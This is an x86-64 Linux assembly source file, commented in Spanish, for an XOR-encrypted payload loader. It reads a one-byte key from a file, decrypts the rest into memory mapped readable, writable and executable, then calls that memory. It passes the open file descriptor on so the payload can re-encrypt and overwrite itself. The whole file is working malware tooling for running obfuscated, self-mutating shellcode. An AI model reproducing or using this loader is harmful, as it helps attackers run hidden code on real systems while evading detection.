;==========================================================================================================================
; Archivo      : polymorphic-xor-8bits-payload-loader.asm
; Creado       : 05/06/2025
; Modificado   : 05/06/2025
; Autor        : Gastón M. González
; Plataforma   : Linux
; Arquitectura : x86-64
; Descripción  : Loader de payload contenido en un archivo cifrado con XOR, con reserva de memoria
;                dinámica según el tamaño del payload y preparación de parámetros para payload
;                polimórfico.
;
;                El primer byte del archivo es la clave de 8 bits [1, 255], el resto es el payload cifrado.
;
;                Para que el payload se pueda autocifrar y sobrescribirse queda disponible en los registros
;                la siguiente información:
;
;                RSI <- (fd) descriptor archivo
;                RCX <- dirección base en memoria del payload)
;                RDX <- tamaño del payload
;
; Compilar     : nasm -f elf64 polymorphic-xor-8bits-payload-loader.asm -o polymorphic-xor-8bits-payload-loader.o
; Linkear      : ld polymorphic-xor-8bits-payload-loader.o -o polymorphic-xor-8bits-payload-loader
; Ejecutar     : ./polymorphic-xor-8bits-payload-loader
; Ejecutar     : ./polymorphic-xor-8bits-payload-loader ; echo "Código de salida:" $?
;==========================================================================================================================
; Licencia MIT:
; Este código es de uso libre bajo los términos de la Licencia MIT.
; Puedes usarlo, modificarlo y redistribuirlo, siempre que incluyas esta nota de atribución.
; NO HAY GARANTÍA DE NINGÚN TIPO, EXPRESA O IMPLÍCITA.
; Licencia completa en: https://github.com/Pithase/asm-payloads-loaders/blob/main/LICENSE
;==========================================================================================================================

section .rodata
   filename db "payload-cipher.bin", 0   ; nombre del archivo que contiene el payload

section .bss
    fd             resq 1          ; descriptor de archivo
    exec_mem       resq 1          ; dirección mmap
    key_byte       resb 1          ; clave XOR de 1 byte

section .text
    global _start

_start:
    ;======================================================================================================================
    ; 1. Alinear RSP a 16 bytes para cumplir con el estándar ABI (RSP mod 16 = 0)
    ;======================================================================================================================
    mov   rax, rsp                 ; RAX = valor actual de RSP
    and   rax, 0xF                 ; RAX = RSP mod 16 (es el resto de RSP/16)
    sub   rsp, rax                 ; RSP = RSP - (RSP mod 16) -> ahora RSP ≡ 0 mod 16 (RSP es congruente con 0 módulo 16)

    ;======================================================================================================================
    ; 2. Abre el archivo que contiene el payload -> open(filename, O_RDWR)
    ;======================================================================================================================
    mov   rax, 2                   ; syscall: open
    lea   rdi, [rel filename]      ; dirección del nombre del archivo
    mov   rsi, 2                   ; O_RDWR (lectura/escritura)
    syscall
    test  rax, rax                 ; comprueba el valor de retorno
    js    open_error               ; si es negativo -> RAX < 0
    mov   [fd], rax                ; guarda el descriptor de archivo

    ;======================================================================================================================
    ; 3. Obtiene el tamaño del archivo -> lseek(fd, offset, whence)
    ;======================================================================================================================
    mov   rax, 8                   ; syscall: lseek
    mov   rdi, [fd]                ; descriptor de archivo
    xor   rsi, rsi                 ; offset = 0
    mov   rdx, 2                   ; SEEK_END = 2
    syscall
    test  rax, rax                 ; comprueba si RAX < 0 (error)
    js    lseek_error              ; si es negativo, hubo un error

    cmp   rax, 2                   ; se necesitan al menos 2 bytes (1 de clave + 1 de payload)
    jl    size_file_error          ; si es < 2, el archivo no es válido

    mov   rbx, rax                 ; RBX = tamaño del archivo
    dec   rbx                      ; tamaño del payload = tamaño del archivo - 1 (descarta el byte de la clave)

    ;======================================================================================================================
    ; 4. Se posiciona al inicio del archivo -> lseek(fd, offset, whence)
    ;======================================================================================================================
    mov   rax, 8                   ; syscall: lseek
    mov   rdi, [fd]                ; descriptor de archivo
    xor   rsi, rsi                 ; offset = 0
    xor   rdx, rdx                 ; SEEK_SET = 0
    syscall
    test  rax, rax                 ; comprueba si RAX < 0 (error)
    js    lseek_error              ; si es negativo, hubo un error

    ;======================================================================================================================
    ; 5. Lee el primer byte del archivo -> read(fd, key_byte, 1)
    ;======================================================================================================================
    mov   rax, 0                   ; syscall: read
    mov   rdi, [fd]                ; descriptor de archivo
    lea   rsi, [rel key_byte]      ; buffer destino
    mov   rdx, 1                   ; cantidad de bytes a leer
    syscall
    test  rax, rax                 ; comprueba el valor de retorno
    jle   read_error               ; si es negativo o cero -> RAX <= 0 (si no se leyó ningún byte o hubo error)

    ;======================================================================================================================
    ; 6. Calcula el tamaño a mapear, redondeando al múltiplo de 4096
    ;======================================================================================================================
    mov   rax, rbx                 ; rax = tamaño del payload
    add   rax, 4095                ; suma 4095 para el redondeo
    and   rax, 0xFFFFFFFFFFFFF000  ; redondea hacia abajo al múltiplo de 4096

    ;======================================================================================================================
    ; 7. Reserva memoria ejecutable (según el tamaño calculado)
    ;    -> mmap(0, roundup(payload_size), PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS)
    ;======================================================================================================================
    mov   rdi, 0                   ; dejar que el sistema elija la dirección
    mov   rsi, rax                 ; tamaño mapeado (redondeado)
    mov   rdx, 7                   ; PROT_READ | PROT_WRITE | PROT_EXEC
    mov   r10, 0x22                ; MAP_PRIVATE | MAP_ANONYMOUS
    mov   r8, -1                   ; sin descriptor de archivo
    xor   r9, r9                   ; offset = 0
    mov   rax, 9                   ; syscall: mmap
    syscall
    test  rax, rax                 ; comprueba el valor de retorno
    js    mmap_error               ; si es negativo -> RAX < 0
    mov   [exec_mem], rax          ; guardar la dirección asignada

    ;======================================================================================================================
    ; 8. Lee el contenido y lo almacena en la memoria reservada, con hasta 3 reintentos en caso de falla
    ;    -> read(fd, exec_mem, payload_size)
    ;======================================================================================================================
    mov   r10, 3                   ; R10 = contador de intentos de lectura restantes

.read_attempt:
    mov   rdi, [fd]                ; descriptor de archivo
    mov   rax, 0                   ; syscall: read
    mov   rsi, [exec_mem]          ; buffer destino (memoria mapeada)
    mov   rdx, rbx                 ; cantidad de bytes a leer = tamaño del payload
    syscall

    cmp   rax, rbx                 ; ¿se leyeron exactamente la cantidad de bytes del payload?
    je   .read_ok                  ; si sí, continúa normalmente

    dec   r10                      ; disminuye contador de intentos
    jz    read_error               ; si R10 = 0, se terminaron los intentos de lectura
    jmp   .read_attempt            ; si aún quedan intentos, repetir la lectura

.read_ok:

    ;======================================================================================================================
    ; SE OMITE close(fd) para heredar el descriptor al payload
    ;======================================================================================================================

    ;======================================================================================================================
    ; 9. Descifra
    ;======================================================================================================================
    mov   rcx, rbx                 ; RCX = payload_size
    mov   rdi, [exec_mem]          ; RDI = puntero al inicio del payload en memoria
    mov   al, [key_byte]           ; AL = clave de descifrado

.decrypt_loop:                     ; inicio del bucle de descifrado
    xor   byte [rdi], al           ; descifra el byte actual aplicando XOR con la clave
    inc   rdi                      ; avanza el puntero al siguiente byte
    loop .decrypt_loop             ; decrementa RCX y repite el bucle mientras RCX > 0

    ;======================================================================================================================
    ; 10. Prepara parámetros para el payload
    ;======================================================================================================================
    mov   rsi, [fd]                ; RSI <- descriptor heredado
    mov   rdx, rbx                 ; RDX <- payload_size
    mov   rcx, [exec_mem]          ; RCX <- dirección base en memoria

    ;======================================================================================================================
    ; 11. Ejecuta el payload
    ;======================================================================================================================
    call  qword [exec_mem]         ; llama al payload cargado en memoria

    ;======================================================================================================================
    ; 12. Salida: Se alcanza solo si el payload retorna
    ;======================================================================================================================
    mov   rax, 60                  ; syscall: exit
    xor   rdi, rdi                 ; RDI = 0 (código de salida 0)
    syscall

    ;======================================================================================================================
    ; 13. Manejo de errores: Salida con código distinto según el error
    ;======================================================================================================================
open_error:
    mov   rdi, 1                   ; RDI = 1 (código de salida 1)
    jmp   exit_error

lseek_error:
    mov   rdi, 2                   ; RDI = 2 (código de salida 2)
    jmp   exit_error

size_file_error:
    mov   rdi, 3                   ; RDI = 3 (código de salida 3)
    jmp   exit_error

read_error:
    mov   rdi, 4                   ; RDI = 4 (código de salida 4)
    jmp   exit_error

mmap_error:
    mov   rdi, 5                   ; RDI = 5 (código de salida 5)

exit_error:
    mov   rax, 60                  ; syscall: exit
    syscall
